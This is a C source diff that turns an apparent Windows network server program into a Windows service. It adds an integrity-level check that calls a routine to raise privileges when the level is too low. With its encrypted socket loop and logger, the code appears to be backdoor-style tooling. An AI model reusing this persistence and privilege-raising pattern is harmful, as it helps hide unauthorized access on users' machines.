@@ -24,6 +24,7 @@
 #include <Windows.h>
 
 #include "..\include\aes.h"
+#include "..\include\install.h"
 #include "..\include\logger.h"
 #include "..\include\net.h"
 #include "..\include\tommath.h"
@@ -119,11 +120,8 @@ static void ServerLoop(SOCKET s) {
 	} while(!quit);
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int EntryPoint(void) {
 	SOCKET s;
-#ifdef _DEBUG
-	FILE *fp;
-#endif
 
 	StartLogger(TEXT(LOGFILE));
 	
@@ -137,6 +135,61 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 	WSACleanup();
 
+	return 1;
+}
+
+void WINAPI Handler(DWORD fdwControl) { }
+
+void ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) {
+	SERVICE_STATUS_HANDLE ssh = RegisterServiceCtrlHandlerA(SERVICE_NAME, &Handler);
+	SERVICE_STATUS ss;
+
+	if(ssh == (SERVICE_STATUS_HANDLE)0)
+		return;
+
+	ss.dwCheckPoint = 0;
+	ss.dwControlsAccepted = 0;
+	ss.dwCurrentState = SERVICE_RUNNING;
+	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
+	ss.dwWaitHint = 0;
+	ss.dwWin32ExitCode = NO_ERROR;
+
+	SetServiceStatus(ssh, &ss);
+
+	EntryPoint();
+
+	ss.dwCheckPoint = 0;
+	ss.dwControlsAccepted = 0;
+	ss.dwCurrentState = SERVICE_STOPPED;
+	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
+	ss.dwWaitHint = 0;
+	ss.dwWin32ExitCode = NO_ERROR;
+
+	SetServiceStatus(ssh, &ss);
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {	
+	SERVICE_TABLE_ENTRY ste[2];
+#ifdef _DEBUG
+	FILE *fp;
+#endif
+
+	GetIlevel();
+
+	if(ilevel < 4) {
+		TryRaiseIlevel();
+	} else {
+		ste[0].lpServiceName = TEXT(SERVICE_NAME);
+		ste[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+		ste[1].lpServiceName = NULL;
+		ste[1].lpServiceProc = NULL;
+
+		if(StartServiceCtrlDispatcher(ste) > 0)
+			return 0;
+	}
+
+	EntryPoint();
+	
 #ifdef _DEBUG
 	if((fp = fopen("memlog.txt", "w")) != NULL) {
 		showmemstats(fp);
